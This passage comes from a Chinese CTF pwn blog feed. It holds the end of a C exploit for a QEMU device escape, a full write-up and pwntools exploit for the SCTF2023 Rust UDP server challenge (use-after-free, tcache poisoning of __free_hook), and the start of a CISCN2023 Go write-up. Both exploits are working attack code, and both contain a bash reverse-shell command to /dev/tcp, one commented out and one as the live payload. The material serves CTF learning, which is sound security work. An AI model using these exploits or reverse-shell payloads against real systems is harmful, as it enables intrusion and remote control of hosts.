class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port)</span>&#123;<br>    <span class="hljs-keyword">return</span> inw(port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port, <span class="hljs-type">uint64_t</span> value)</span>&#123;<br>    outw(value, port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    pmio_write(<span class="hljs-number">2</span>, addr);<br>    pmio_write(<span class="hljs-number">4</span>, addr &gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_size</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>&#123;<br>    pmio_write(<span class="hljs-number">6</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_time</span><span class="hljs-params">(<span class="hljs-type">size_t</span> value)</span>&#123;<br>    pmio_write(<span class="hljs-number">10</span>, value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_bh</span><span class="hljs-params">()</span>&#123;<br>    pmio_write(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> p_addr, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x20</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">1</span>)) = p_addr;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">9</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_exec_time</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size, <span class="hljs-type">uint16_t</span> offset)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x30</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">1</span>)) = size;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode1</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> add_byte, <span class="hljs-type">uint8_t</span> xor_byte, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">1</span>)) = add_byte;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">2</span>)) = xor_byte;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2202</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode2</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2022</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> pem_buf;<br>    <span class="hljs-type">size_t</span> heap_addr;<br>    <span class="hljs-type">size_t</span> elf_base;<br>    iopl(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// leak heap_addr</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-1. leak heap_addr&quot;</span>);<br>    pem_buf = gva_to_gpa(buf);<br>    write_addr(pem_buf);<br>    write_size(<span class="hljs-number">0x400</span>);<br>    set_encode1(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);   <br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x310</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    heap_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x308</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-type">size_t</span> hfdev_addr = heap_addr - <span class="hljs-number">2696</span>;<br>    <span class="hljs-type">size_t</span> time_struct = hfdev_addr + <span class="hljs-number">0x1d40</span>;<br>    <span class="hljs-type">size_t</span> bh_struct = hfdev_addr - <span class="hljs-number">0x101a80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;time_struct_addr_is %#lx\n&quot;</span>, time_struct);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bh_struct_addr_is %#lx\n&quot;</span>, bh_struct);<br>    <br><br>    <span class="hljs-comment">//leak elf_base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-2. leak qemu elf_addr&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x10</span>)) = time_struct;<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x18</span>)) = bh_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    write_time(<span class="hljs-number">8</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x310</span>);<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x308</span>)) = heap_addr ^ time_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">1</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x338</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    <span class="hljs-type">size_t</span> leak_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x330</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is %#lx\n&quot;</span>, leak_addr);<br>    elf_base = leak_addr - <span class="hljs-number">0x381190</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2D6610</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;qemu_elf_base_is %#lx\n&quot;</span>, elf_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-3. hijack time_struct&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    <span class="hljs-type">size_t</span> faker_time_struct_addr = heap_addr + <span class="hljs-number">0x108</span>;<br>    <span class="hljs-type">size_t</span> cmd_addr = faker_time_struct_addr + <span class="hljs-number">0x40</span>;<br>    <span class="hljs-type">size_t</span> faker_time_struct[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    <span class="hljs-comment">//char cmd[0x40] = &quot;/bin/bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.168.184.142/8888 0&gt;&amp;1\&#x27;&quot;;</span><br>    faker_time_struct[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    faker_time_struct[<span class="hljs-number">1</span>] = time_struct - <span class="hljs-number">0x110f360</span>;<br>    faker_time_struct[<span class="hljs-number">2</span>] = system_plt;<br>    faker_time_struct[<span class="hljs-number">3</span>] = cmd_addr;<br>    faker_time_struct[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>    faker_time_struct[<span class="hljs-number">5</span>] = <span class="hljs-number">0x100000000</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span>, faker_time_struct, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span> + <span class="hljs-number">0x40</span>, cmd, <span class="hljs-number">0x40</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x310</span>)) = faker_time_struct_addr ^ time_struct;<br>    set_encode2(<span class="hljs-number">0x318</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br><br>    <span class="hljs-comment">//0x1d40  0x101a80</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sctf2023 Brave Knights and Rusty Swords</title>
    <link href="/2023/06/27/sctf2023/"/>
    <url>/2023/06/27/sctf2023/</url>
    
    <content type="html"><![CDATA[<p>上次在aliyun的比赛上也遇到过rust语言的题，但是那道rust的题是一道传统的堆菜单题，题目的输入输出完全都不用看ida就知道，而且后门函数也直接给出了，很容易就可以写出来。这次sctf给的是一个upd服务程序，输入输出也没有给你很多信息，这下就只能去拿ida去硬逆了（😭）。</p><p>由于是udp服务，nc连接时使用<code>nc -u 192.168.184.133 8080</code>。</p><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>首先看到ida中的main函数很简单，肯定不是逻辑的主体，使用gdb attach程序的进程后发现有server_game::main函数，这个就是真正的逻辑主体函数：</p><img src="/img/14/Screenshot 2023-06-27 212845.png" style="zoom:50%;" /><p>点进去发现流程极其复杂，而且很多代码块都是<code>jmp  short $+2</code>相连接的，不知道为什么rust这样编译（感觉没有这个jmp，程序也能往后直接执行相应的代码块）</p><img src="/img/14/Screenshot 2023-06-27 214212.png"><p>伪代码就更不用说了，也不是特别好看，有很多奇奇怪怪的函数，不过这里重点关注<code>UdpSocket::recv_from</code>，因为用户就是通过这个函数来传递数据给程序的，而该udp服务是不断接收命令循环的，所以可以初步定位到如下伪代码：</p><img src="/img/14/Screenshot 2023-06-28 120409.png"><p>​                               </p><h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>接下来就是找到程序是怎样比较的字符串的，我当时是随便输入一段字符，然后使用gdb定位到<code>UdpSocket::send_to</code>函数，这时是所有的字符都判断失败的情况：</p><img src="/img/14/Screenshot 2023-06-27 221618.png" style="zoom: 50%;" /><p>接下来使用ida从定位到<code>UdpSocket::send_to</code>函数自下往上找判断分支的代码块：</p><img src="/img/14/Screenshot 2023-06-27 222735.png"><p>最后发现所有的判断分支的代码块都是如下格式，中间的那个函数估计就是判断字符串的，而字符串地址就是在rdx中，ecx就是字符串长度：</p><img src="/img/14/Screenshot 2023-06-27 223650.png"><p>进一步查看byte_E64F1地址中的内容就可以知道比较的字符串了</p><img src="/img/14/Screenshot 2023-06-27 224141.png" style="zoom: 50%;" /><p>​                                 </p><p>最后我发现其实只有再将上面定位到的伪代码段往下多翻几行就可以看到if后有个cmp字样的函数，很容易想到这个就是判断字符串的函数，不用上面那么麻烦（🧐）</p><img src= "/img/14/Screenshot 2023-06-27 224513.png"><p>​                              </p><p>最后可以得到比较的字符串为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">login <br>register <br>purchase <br>fight <br>draw_000001 <br>draw_011214 <br>show_infomation <br>Data_testing_console <br>write_signature<br></code></pre></td></tr></table></figure><p>​                                               </p><h4 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h4><p>知道输入什么命令，接下来就容易多了。</p><p>login命令的格式是给提示的，可以直接类比到register命令。</p><p>purchase是用得到的100 currency去买卡。</p><p>draw_000001和draw_011214去抽hero。</p><p>fight是去打怪升级，升到10级这个游戏就算是赢了。</p><p>Data_testing_console只有在fight完这个游戏后才能使用。</p><p>fight的游戏赢了之后并没有什么去执行漏洞代码块的奖励，接下来就只能去看看Data_testing_console了。</p><p>进入Data_testing_console命令，一开始就提示我们<code>Enter function name:</code>，查看<code>server_game::Data_testing_console</code>函数的伪代码，这里看伪代码也是只看<code>UdpSocket::recv_from</code>和<code>UdpSocket::send_to</code>函数附近的。发现在该函数中<code>UdpSocket::send_to</code>只调用过一次，发送接下来的字符串<code>Enter the command:</code>，使用gdb attach一下进程发现该过程是在<code>server_game::Memory_Debug_console</code>函数中（带server_game字段的函数都需要看看 😫）</p><img src="/img/14/Screenshot 2023-06-27 231805.png" style="zoom: 50%;" /><p>查看<code>server_game::Memory_Debug_console</code>函数伪代码发现有libc字段</p><img src="/img/14/Screenshot 2023-06-27 231914.png" style="zoom: 80%;" /><p>联想到function name输入read后发现直接传回了read函数libc地址</p><img src="/img/14/Screenshot 2023-06-27 234719.png"><p>剩下的输入命令就使用和part2一样的办法找到命令字段为data_push和quit</p><p>​                                                         </p><h4 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h4><p>输入quit就是退出没什么可说的，输入data_push后又会进入一个<code>server_game::data_push</code>函数，也是用前面的方法找到operation字段push和grow。输入不同的operation接着都会有一个vector number去用switch判断，最后输入一个value。</p><p>push和grow，它们switch的case中代码段大致相同。</p><p>就伪代码而言自己完全无法知道哪些函数是需要重点关注的，只能使用gdb一步一步去调试，调试的时候注意输入的value，如果是某函数调用的参数也是该value就仔细对比一下函数前后寄存器以及[寄存器]值的变化。</p><p>这里我调试push操作时输入的value为48（value尽量特殊一点，这样便于观察），最后定位到一个带push字段的函数</p><img src="/img/14/Screenshot 2023-06-28 001800.png" style="zoom:50%;" /><p>rdi中的值前后对比如下：</p><img src= "/img/14/Screenshot 2023-06-28 001855.png"><p>​                             </p><img src= "/img/14/Screenshot 2023-06-28 001912.png"><p>多调试几次后就可以知道push的操作就是将value保存到栈上，value不能大于0x100，value就是一个字节的ASCII码，前一个字段就是push数据的大小。</p><p>vector number就是可以让value保存到不同区域：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># vector number = 1时，在0x95a0 + rsp(server_game::data_push函数中的栈顶) </span><br><span class="hljs-comment"># vector number = 2时，在0x96b0 + rsp</span><br><span class="hljs-comment"># vector number = 3时，在0x97c0 + rsp</span><br><span class="hljs-comment"># 每个区域正好相差0x110</span><br></code></pre></td></tr></table></figure><p>​                                         </p><p>调试grow操作时，也是定位到一个带grow字段的函数：</p><img src="/img/14/Screenshot 2023-06-28 012725.png" style="zoom:50%;" /><p>同时该函数伪代码中的比较的数据字段意义如下：</p><img src="/img/14/Screenshot 2023-06-28 012544.png"><p>在最后有一个带heap字段的函数，它的作用与realloc函数几乎一样：</p><img src="/img/14/Screenshot 2023-06-28 012849.png"><p>​               </p><p>最后发现vector number的作用与push一样，除了vector number &#x3D; 2以外，别的vector number都只能使用一次。</p><p>当vector number &#x3D; 2，输入的value（大于0x100时就使用堆存数据）与先前的value一样时该堆块就会释放，但是指针未清零，并且依旧可以使用push传入数据，就是一个uaf。</p><p>​                           </p><h4 id="part5"><a href="#part5" class="headerlink" title="part5"></a>part5</h4><p>漏洞利用很简单，libc的地址是白给的，直接利用uaf来实现tcache attack去修改free_hook，最后反弹shell。</p><p>最初我的利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">size = <span class="hljs-number">0x1d0</span><br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base))<br>grow(<span class="hljs-number">4</span>, size)<br>grow(<span class="hljs-number">5</span>, size)<br>send_payload(<span class="hljs-number">5</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base))<br></code></pre></td></tr></table></figure><p>利用vector number &#x3D; 2时可以使用多次，形成double free后直接修改tcache next指针为free_hook，再利用grow申请到free_hook，最后push数据到free_hook。但是实际上这样向free_hook写入数据是直接报错的，当push完第一个字节到free_hook上后，接下来调用drop_in_place函数：</p><img src="/img/14/Screenshot 2023-06-27 164146.png"><p>最后有调用的free的功能，这时free_hook中仅有写入的一个字节，但依旧去调用free_hook中的错误地址：</p><img src="/img/14/Screenshot 2023-06-28 015131.png"><p>​                                                                                         </p><p>当时我就自闭了😭，之后我看<a href="https://blog.wm-team.cn/index.php/archives/38/#Brave+Knights+and+Rusty+Swords">W&amp;M的wp</a>后才知道push操作也能申请堆块，刚开始不使用grow，直接push，如果push的数据大于0x100也是会申请堆上的内存，改用push就可以解决上面的问题。</p><p>​                                     </p><p>最后完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;192.168.184.133&#x27;</span>,<span class="hljs-number">8080</span>, typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;server_game&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;register a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Registration successful! You have received 100 currency.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;login a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome back&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;purchase 100&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Purchase successful! You have received 10 cards.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = <span class="hljs-string">b&#x27;&#x27;</span><br>    p.sendline(<span class="hljs-string">b&#x27;fight&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;fight: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;attack&#x27;</span>)<br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> t != <span class="hljs-string">b&#x27;\n&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">grow</span>(<span class="hljs-params">num, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;grow&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the grow value:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">num, value</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;push&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;value:&#x27;</span>, <span class="hljs-built_in">str</span>(value).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">num, payload</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        push(num, i)<br><br>p.sendline(<span class="hljs-string">b&#x27;Data_testing_console&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter function name:&#x27;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>libc.address = libc_base<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the command:&#x27;</span>, <span class="hljs-string">b&#x27;data_push&#x27;</span>)<br><br><br>size = <span class="hljs-number">0x200</span><br>grow(<span class="hljs-number">1</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x58</span>))<br>grow(<span class="hljs-number">4</span>, size)<br><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>send_payload(<span class="hljs-number">5</span>, payload)<br>grow(<span class="hljs-number">5</span>, size)<br><br><span class="hljs-comment"># push 1 0x95a0  </span><br><span class="hljs-comment"># push 2 0x96b0</span><br><span class="hljs-comment"># push 3 0x97c0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2023 shell we go</title>
    <link href="/2023/05/30/CISCN2023-shell-we-go/"/>
    <url>/2023/05/30/CISCN2023-shell-we-go/</url>
    
    <content type="html"><![CDATA[<p>在国赛上遇到的一道go语言的题，自己也是第一次遇到，在此记录一下复现的过程。</p><p>​</p><p>由于go语言编译都是静态的，而且程序把所有的符号表都去掉了，对于逆向的难度大大提升，虽然可以通过输出的字符串快速找到主函数，但是对于一些go语言的库函数根本就无法判断，分析这些库函数只会浪费大量时间；这里使用一下<a href="https://github.com/renshareck/IDAGolangHelper_SupportGo1.20">IDAGolangHelper</a>，可以修复go的符号表。</p><p>进入程序后很快就想到输入常用的shell命令，但是输出只有“Cert Is A Must”，查找”Cert“字符串可以看到还有一个”Cert complete, you can explore more“，说明需要输入一些东西认证：</p><img src="/img/13/Screenshot 2023-05-30 172622.png" style="zoom:80%;" /><p>​</p><p>引用该字符串的函数为main_unk_func0b01，好像看不出什么东西：</p><img src="/img/13/Screenshot 2023-05-30 173651.png" style="zoom: 80%;" /><p>接着向上找引用main_unk_func0b01的函数，看到main_unk_func0b05函数，很快就发现伪代码中没有调用过main_unk_func0b01函数的痕迹：</p><img src="/img/13/Screenshot 2023-05-30 174350.png" style="zoom: 67%;" /><p>​</p><p>直接查看该函数的汇编，果然ida7.7的伪代码功能对go无法准确识别。函数中下面的块全是cmp，将一些奇怪的16进制数变成字符串（需要逆序看），可以清晰地看到基本上全是一个先比较字符串长度，再去比较字符内容的一个过程，shell中不同指令的实现是将该过程重复多次来判断指令的内容，进而跳转到相应的地方去实现不同指令的功能：</p><img src="/img/13/Screenshot 2023-05-30 184428.png" style="zoom: 50%;" 